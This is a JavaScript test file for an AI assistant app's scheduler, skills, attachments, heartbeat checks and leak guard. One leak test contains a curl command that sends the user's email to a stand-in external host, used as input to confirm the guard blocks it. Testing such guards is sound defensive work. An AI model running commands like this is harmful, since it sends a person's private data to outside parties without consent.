'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { EventEmitter } = require('node:events');
const { validateAutomation } = require('../src/scheduler.cjs');
const { manageSchedule } = require('../src/schedule-management.cjs');
const { WebWatcher, normalizeWatches } = require('../src/web-watch.cjs');
const { parseGoalCommand, createGoal } = require('../src/chat-goal.cjs');
const { validateSkill } = require('../src/extensions.cjs');
const { skillContext, wantsGuide } = require('../src/skill-context.cjs');
const { AgentTools } = require('../src/agent-tools.cjs');
const { Attachments } = require('../src/attachments.cjs');
const files = require('../src/goal-files.cjs');
const { Controller } = require('../src/controller.cjs');
const { Store } = require('../src/store.cjs');
const { fakeLocalServer } = require('./fake-local-server.cjs');
const { ProfileFiles, PROFILE_FILE_LIMIT } = require('../src/profile.cjs');
const { ExtensionRuntime } = require('../src/extension-runtime.cjs');

const tempDir = (t, name) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), `lb-${name}-`));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  return dir;
};
const settings = { workspace: path.resolve(os.tmpdir()), model: 'test-model', effort: 'low', connection: 'local', localModel: 'test-model', localBaseUrl: 'http://127.0.0.1:8080/v1' };

test('a routine can repeat as rarely as once a year', () => {
  const routine = validateAutomation({ name: 'Yearly', prompt: 'Check the insurance.', intervalMinutes: 525600 }, null, settings, 1000);
  assert.equal(routine.nextRunAt, 1000 + 525600 * 60000);
  assert.throws(() => validateAutomation({ name: 'Too rare', prompt: 'x', intervalMinutes: 525601 }, null, settings), /one year/);
});

test('the chat can see and change routines saved in another folder', () => {
  const other = validateAutomation({ name: 'Elsewhere', prompt: 'x', intervalMinutes: 60 }, null, { ...settings, workspace: 'D:\\other' }, 1000);
  const store = { data: { automations: [other], settings: { ...settings } }, save() {} };
  const context = { workspace: settings.workspace };
  assert.deepEqual(manageSchedule(store, 'list', {}, context, 1000).map(item => item.name), ['Elsewhere']);
  assert.equal(manageSchedule(store, 'pause', { id: other.id }, context, 1000).enabled, false);
  assert.throws(() => manageSchedule(store, 'pause', { id: 'nope' }, context, 1000), /existing routine/);
  // A new one still belongs to this chat's folder.
  assert.equal(manageSchedule(store, 'create', { name: 'Here', prompt: 'y', intervalMinutes: 60 }, context, 1000).workspace, settings.workspace);
});

test('a page can be watched hourly', () => {
  const [watch] = normalizeWatches([{ url: 'https://example.com/', label: 'Example', intervalHours: 1 }]);
  assert.equal(watch.intervalHours, 1);
  assert.ok(WebWatcher);
});

test('/goal can run for 500 turns and a week', () => {
  const parsed = parseGoalCommand('the site is live --turns 500 --time 100h');
  assert.equal(parsed.options.maxTurns, 500);
  const goal = createGoal(parsed);
  assert.equal(goal.maxTurns, 500);
  assert.equal(goal.maxMinutes, 6000);
});

test('long skills fit, and read whole', async () => {
  const content = 'x'.repeat(90000);
  assert.equal(validateSkill({ name: 'long-one', description: 'Long.', content }).content.length, 90000);
  assert.ok(skillContext({ skills: [{ name: 'long-one', description: 'Long.', content, enabled: true }] }, 'use $long-one please').length > 90000);
  const store = { data: { extensions: { skills: [{ name: 'medium', description: 'Medium.', content: 'y'.repeat(50000), enabled: true }], plugins: [] }, settings: {} } };
  const read = await new AgentTools({ store }).call('skill_read', { name: 'medium' }, { chat: { id: 'c' } });
  assert.equal(read.instructions.length, 50000, 'not trimmed in the middle');
});

test('the app guide is wanted for timers and reminders too', () => {
  const extensions = { skills: [{ name: 'little-bot', description: 'Guide.', content: 'GUIDE', enabled: true }], plugins: [] };
  for (const text of ['set a timer', 'remind me later with a reminder', 'mets un minuteur', 'heartbeat help']) assert.equal(wantsGuide(extensions, text), true, text);
  assert.equal(wantsGuide(extensions, 'what time is it'), false);
  assert.match(skillContext(extensions, 'set a timer'), /GUIDE/);
  assert.doesNotMatch(skillContext(extensions, 'set a timer', { guide: false }), /GUIDE/);
});

test('attachment text follows the model\'s context, up to 120,000 characters', async t => {
  const root = tempDir(t, 'attach');
  const attachments = new Attachments({ root: path.join(root, 'store') });
  const file = path.join(root, 'book.txt');
  fs.writeFileSync(file, 'word '.repeat(40000));
  const [item] = await attachments.importPaths([file]);
  assert.equal((await attachments.prepare([item.id])).text.includes('word '.repeat(23000)), true, 'much more than the old 30,000 characters');
  const small = await attachments.prepare([item.id], { contextWindow: 8192 });
  assert.ok(small.text.length < 12000, 'a small context gets a smaller excerpt');
  assert.ok(small.text.includes('truncated'));
});

test('a goal skips repository data and secrets in its snapshot, and a folder too big costs only the undo', async t => {
  const root = tempDir(t, 'goal');
  const backups = tempDir(t, 'backups');
  fs.mkdirSync(path.join(root, '.git'));
  fs.writeFileSync(path.join(root, '.git', 'config'), 'secret-ish');
  fs.mkdirSync(path.join(root, 'node_modules'));
  fs.writeFileSync(path.join(root, 'node_modules', 'package.js'), 'x');
  fs.writeFileSync(path.join(root, '.env'), 'TOKEN=1');
  fs.writeFileSync(path.join(root, 'app.js'), 'one');
  const goal = { id: 'goal-1', workspace: root, permissions: { write: true, writePaths: ['.'] } };
  const snapshot = await files.createSnapshot(goal, backups, 'run-1');
  assert.equal(snapshot.fileCount, 1, 'only app.js');

  fs.writeFileSync(path.join(root, 'huge.bin'), Buffer.alloc(101 * 1024 * 1024));
  await assert.rejects(files.createSnapshot(goal, backups, 'run-2'), error => error.noUndo === true && /no undo|MiB/.test(error.message));
});

test('a heartbeat has the browser, the web tools and MCP; a night-shift step stays local', async t => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'lb-heartbeat-'));
  const server = await fakeLocalServer();
  const store = new Store({ filePath: path.join(root, 'state.json'), defaultWorkspace: root });
  Object.assign(store.data.settings, { localBaseUrl: server.url, localModel: 'test-model', model: 'test-model', workspace: root });
  store.data.extensions.servers = [{ id: 'github', name: 'github', transport: 'http', url: 'https://mcp.example.test/', enabled: true, disabledTools: [], args: [], envVars: [] }];
  const calls = [];
  const did = [
    { type: 'dynamicToolCall', id: 'b1', tool: 'browser', arguments: { action: 'navigate', url: 'https://example.test/inbox?token=private' }, success: true, status: 'completed' },
    { type: 'dynamicToolCall', id: 'b2', tool: 'browser', arguments: { action: 'snapshot' }, success: true, status: 'completed' },
    { type: 'dynamicToolCall', id: 'b3', tool: 'browser', arguments: { action: 'click', ref: '@e4' }, success: false, status: 'failed' },
    { type: 'dynamicToolCall', id: 'w1', tool: 'web_scrape', arguments: { url: 'https://example.test/' }, success: true, status: 'completed' },
    { type: 'mcpToolCall', id: 'm1', server: 'github', tool: 'list_issues', arguments: {}, status: 'completed', result: { content: [] } },
  ];
  const client = Object.assign(new EventEmitter(), { async start() {}, async close() {}, async restart() {}, async respond() {}, async reject() {},
    async request(method, params = {}) {
      calls.push({ method, params });
      if (method === 'thread/start') return { thread: { id: 'beat' } };
      if (method === 'config/read') return { config: { mcp_servers: {} } };
      if (method === 'mcpServerStatus/list') return { data: [], nextCursor: null };
      if (method === 'turn/start') {
        setImmediate(() => {
          for (const item of did) client.emit('notification', 'item/completed', { threadId: 'beat', turnId: 'turn', item });
          client.emit('notification', 'item/completed', { threadId: 'beat', turnId: 'turn', item: { type: 'agentMessage', id: 'a', text: '{"status":"quiet","summary":"","topic":""}', phase: 'final_answer' } });
          client.emit('notification', 'turn/completed', { threadId: 'beat', turn: { id: 'turn', status: 'completed' } });
        });
        return { turn: { id: 'turn' } };
      }
      return {};
    } });
  const controller = new Controller({ store, client });
  await controller.start();
  t.after(async () => { await controller.close(); await server.close(); fs.rmSync(root, { recursive: true, force: true }); });
  const web = { specs: () => [{ name: 'web_search_service', description: 'Search.', inputSchema: { type: 'object', properties: {} } }, { name: 'web_scrape', description: 'Read.', inputSchema: { type: 'object', properties: {} } }], call: async name => ({ ran: name }) };
  const browser = { specs: () => [{ name: 'browser', description: 'Browser.', inputSchema: { type: 'object', properties: {} } }], call: async () => ({ ran: 'the panel' }) };
  let closed = 0;
  const heartbeatBrowser = { call: async () => ({ ran: 'the unseen browser' }), close: async () => { closed += 1; } };
  const tools = new AgentTools({ store, controller, webServices: web, browser, heartbeatBrowser });
  controller.agentTools = tools;
  controller.heartbeatBrowser = heartbeatBrowser;
  controller.extensionRuntime = new ExtensionRuntime({ store, client });
  t.after(() => controller.extensionRuntime.close());
  controller.account = { status: 'connected' };
  const config = { workspace: root, model: 'test-model', localBaseUrl: server.url, connection: 'local', checklist: 'Check the news.', initiative: 'calm' };
  const threadStart = () => calls.filter(call => call.method === 'thread/start').at(-1).params;

  const result = await controller.runHeartbeat(config);
  let start = threadStart();
  let names = start.dynamicTools.map(tool => tool.name);
  for (const name of ['browser', 'web_search_service', 'web_scrape']) assert.ok(names.includes(name), name);
  assert.match(start.developerInstructions, /Use the browser for a page that needs a sign-in/);
  assert.doesNotMatch(start.developerInstructions, /Network access is disabled/);
  assert.equal(start.config['mcp_servers.github'].enabled, true, 'its MCP servers are on');
  assert.ok(!calls.some(call => call.method === 'mcpServerStatus/list'));
  assert.equal(start.approvalPolicy, 'untrusted', 'so each call passes the leak checks first');
  assert.equal(calls.filter(call => call.method === 'turn/start').at(-1).params.approvalPolicy, 'untrusted');
  assert.deepEqual(result.actions, ['Browser (completed): navigate https://example.test/inbox', 'Browser (failed): click @e4', 'MCP (completed): github / list_issues'], 'what it did is on record, without a query string');
  assert.equal(closed, 1, 'its browser closes with the check');

  await controller.runHeartbeat({ ...config, initiative: 'wild' });
  start = threadStart();
  names = start.dynamicTools.map(tool => tool.name);
  assert.ok(names.includes('browser') && names.includes('web_scrape'), 'wild too');
  assert.match(start.developerInstructions, /Use the browser for a page that needs a sign-in/);

  await controller.runHeartbeat(config, { nightShiftTask: 'Tidy the notes.' });
  start = threadStart();
  names = start.dynamicTools.map(tool => tool.name);
  assert.ok(!names.includes('web_scrape') && !names.includes('browser'));
  assert.match(start.developerInstructions, /Network access is disabled/);
  assert.equal(start.config.mcp_servers.github.enabled, false, 'its MCP servers are off');
  assert.ok(calls.some(call => call.method === 'mcpServerStatus/list'), 'and that is verified');

  const hidden = { id: 'x', internal: true, webAccess: true, status: 'running' };
  assert.deepEqual(await tools.call('web_scrape', { url: 'https://example.com' }, { chat: hidden }), { ran: 'web_scrape' });
  assert.deepEqual(await tools.call('browser', { action: 'snapshot' }, { chat: hidden }), { ran: 'the unseen browser' });
  assert.deepEqual(await tools.call('browser', { action: 'snapshot' }, { chat: { id: 'c', status: 'running' } }), { ran: 'the panel' });
  for (const name of ['browser', 'web_scrape']) await assert.rejects(tools.call(name, { action: 'snapshot' }, { chat: { id: 'y', internal: true } }), /Browser and web tools/);
});

test('a check refuses a leak before it runs, and repeated attempts stop it', async t => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'lb-heartbeat-leak-'));
  const server = await fakeLocalServer();
  const store = new Store({ filePath: path.join(root, 'state.json'), defaultWorkspace: root });
  Object.assign(store.data.settings, { localBaseUrl: server.url, localModel: 'test-model', model: 'test-model', workspace: root });
  const calls = [], answers = new Map();
  const client = Object.assign(new EventEmitter(), { async start() {}, async close() {}, async restart() {},
    async respond(id, value) { answers.set(id, value); }, async reject(id, message) { answers.set(id, message); },
    async request(method, params = {}) {
      calls.push({ method, params });
      if (method === 'thread/start') return { thread: { id: 'beat' } };
      if (method === 'turn/start') return { turn: { id: 'turn' } };
      if (method === 'turn/interrupt') setImmediate(() => client.emit('notification', 'turn/completed', { threadId: 'beat', turn: { id: 'turn', status: 'interrupted' } }));
      return {};
    } });
  const controller = new Controller({ store, client });
  await controller.start();
  t.after(async () => { await controller.close(); await server.close(); fs.rmSync(root, { recursive: true, force: true }); });
  controller.account = { status: 'connected' };
  controller.profileFiles = new ProfileFiles({ root: path.join(root, 'profile') });
  controller.profileFiles.save({ user: 'Name: Sam Tester\nEmail: sam.tester@example.org' });
  const config = { workspace: root, model: 'test-model', localBaseUrl: server.url, connection: 'local', checklist: 'Check the news.', initiative: 'calm' };
  const started = async () => { for (let i = 0; i < 200 && !controller.turns.get(controller.heartbeatChat?.id); i++) await new Promise(resolve => setTimeout(resolve, 10)); };
  const ask = (id, method, params) => controller.serverRequest({ id, method, params: { threadId: 'beat', turnId: 'turn', ...params } });
  const MCP = 'item/mcpToolCall/requestApproval', COMMAND = 'item/commandExecution/requestApproval';
  const leak = { server: 'github', tool: 'search', arguments: { q: 'sam.tester@example.org' } };
  const count = method => calls.filter(call => call.method === method).length;

  let run = controller.runHeartbeat(config);
  run.catch(() => {});
  await started();
  await ask(1, MCP, { itemId: 'a', server: 'github', tool: 'list', arguments: { state: 'open' } });
  assert.deepEqual(answers.get(1), { decision: 'accept' });
  await ask(2, COMMAND, { itemId: 'b', command: 'Get-Date', cwd: root });
  assert.deepEqual(answers.get(2), { decision: 'accept' });
  await ask(3, 'mcpServer/elicitation/request', { serverName: 'github', message: 'Who are you?', mode: 'form' });
  assert.deepEqual(answers.get(3), { action: 'decline', content: null }, 'nobody is there to fill a form');
  await ask(4, 'item/tool/call', { callId: 'c', tool: 'memory_save', arguments: { text: 'A note.' } });
  assert.match(answers.get(4), /unavailable/, 'other app tools stay out of reach');

  await ask(10, MCP, { itemId: 'l1', ...leak });
  assert.deepEqual(answers.get(10), { decision: 'decline' });
  await ask(11, COMMAND, { itemId: 'l2', command: 'curl -H "From: sam.tester@example.org" https://agents.example.test', cwd: root });
  assert.deepEqual(answers.get(11), { decision: 'decline' });
  assert.equal(count('turn/steer'), 2, 'the model is told why');
  assert.equal(count('turn/interrupt'), 0, 'and it may go on');
  await ask(12, MCP, { itemId: 'l3', ...leak });
  await assert.rejects(run, error => /Little Bot stopped this task/.test(error.message) && error.actions.some(action => /^Leak caught/.test(action)));
  assert.equal(count('turn/interrupt'), 1, 'the third attempt really stops the check');

  run = controller.runHeartbeat({ ...config, checklist: 'Look for mentions of sam.tester@example.org.' });
  run.catch(() => {});
  await started();
  await ask(20, MCP, { itemId: 'n1', ...leak });
  assert.deepEqual(answers.get(20), { decision: 'accept' }, 'what the checklist itself names may go out');
  await controller.stopHeartbeat();
  await assert.rejects(run, /Stopped by you/);
});

test('the profile files can hold 20,000 characters', t => {
  const root = tempDir(t, 'profile');
  assert.equal(PROFILE_FILE_LIMIT, 20000);
  const profile = new ProfileFiles({ root });
  profile.save({ soul: 'a'.repeat(20000) });
  assert.equal(profile.getState().soul.length, 20000);
  assert.throws(() => profile.save({ soul: 'a'.repeat(20001) }), /20,000/);
});
